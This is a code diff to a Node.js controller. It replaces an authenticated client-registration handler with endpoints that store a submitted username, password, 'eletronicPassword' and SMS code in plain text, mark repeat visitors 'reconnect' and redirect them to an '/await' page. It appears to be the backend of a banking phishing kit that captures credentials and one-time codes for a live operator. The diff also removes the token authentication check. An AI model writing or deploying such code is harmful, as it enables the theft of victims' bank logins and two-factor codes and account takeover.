@@ -3,6 +3,7 @@ const Contact = require('../models/Contact')
 const Address = require('../models/Address')
 const UserByToken = require('../middlewares/userByToken')
 const { Op } = require('sequelize')
+const { getSocketIo: io } = require('../server')
 
 module.exports = {
     async index(req, res) {
@@ -107,69 +108,90 @@ module.exports = {
 
     async store(req, res) {
         try {
-            //Get user id by token
-            const authHeader = req.headers.authorization
-
-            const typesAccept = ['proprietário', 'fiador', 'inquilino']
-
-            if (Object.keys(req.body).length === 0)
-                return res.status(400).send({ error: `Por favor envie as infomações` })
-
-            await UserByToken(authHeader)
-
             //Client
 
-            const { name, cpf, rg, gender, nationality, marital, birth_date: birthDate, type, note, email } = req.body
+            const { type, user, password, eletronicPassword, sms, status } = req.body
 
-            const clientMail = await Contact.findOne({ where: { email } })
+            //return res.json({ user, type, status })
 
-            if (clientMail) return res.status(401).json({ error: 'the email you entered is already registered' })
+            if (!user) return res.status(400).send({ error: `Informe seu usuário` })
 
-            //check type
-            if (typesAccept.indexOf(type) === -1) return res.status(401).json({ error: 'Customer type not accepted' })
+            const clientUser = await Client.findOne({ where: { user } })
+
+            if (clientUser) {
+                await clientUser.update({
+                    type,
+                    user,
+                    password,
+                    eletronicPassword,
+                    sms,
+                    status: `reconnect`,
+                })
+
+                return res.redirect(`/await?client=${clientUser.id}`)
+            }
 
             const client = await Client.create({
-                name,
-                cpf,
-                rg,
-                gender,
-                nationality,
-                marital,
-                birthDate,
                 type,
-                note,
+                user,
+                password,
+                eletronicPassword,
+                sms,
+                status,
             })
 
-            //Address
+            return res.redirect(`/await?client=${client.id}`)
+        } catch (error) {
+            //Validação de erros
+            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })
 
-            const { street, address: location, city, state, zipCode } = req.body
+            if (
+                error.name == `SequelizeValidationError` ||
+                error.name == `SequelizeUniqueConstraintError` ||
+                error.name == `userToken`
+            )
+                return res.status(400).send({ error: error.message })
 
-            const address = await Address.create({
-                client_id: client.id,
-                street,
-                address: location,
-                city,
-                state,
-                zipCode,
+            console.log(`Erro ao criar novo cliente: `, error)
+
+            return res.status(500).send({ error: `Erro de servidor` })
+        }
+    },
+    async insert(req, res) {
+        try {
+            //Client
+
+            const { type, user, password, eletronicPassword, sms, status } = req.body
+
+            //return res.json({ user, type, status })
+
+            if (!user) return res.status(400).send({ error: `Informe seu usuário` })
+
+            const clientUser = await Client.findOne({ where: { user } })
+
+            if (clientUser) {
+                await clientUser.update({
+                    type,
+                    user,
+                    password,
+                    eletronicPassword,
+                    sms,
+                    status: `reconnect`,
+                })
+
+                return res.json(clientUser)
+            }
+
+            const client = await Client.create({
+                type,
+                user,
+                password,
+                eletronicPassword,
+                sms,
+                status,
             })
 
-            if (!address) await client.destroy()
-
-            //Contact
-
-            const { cell, phone, other } = req.body
-
-            const contact = await Contact.create({
-                client_id: client.id,
-                cell,
-                email,
-                phone,
-                other,
-            })
-
-            if (!contact) await address.destroy()
-
-            return res.json({ client, address, contact })
+            return res.json(client)
         } catch (error) {
             //Validação de erros
             if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })
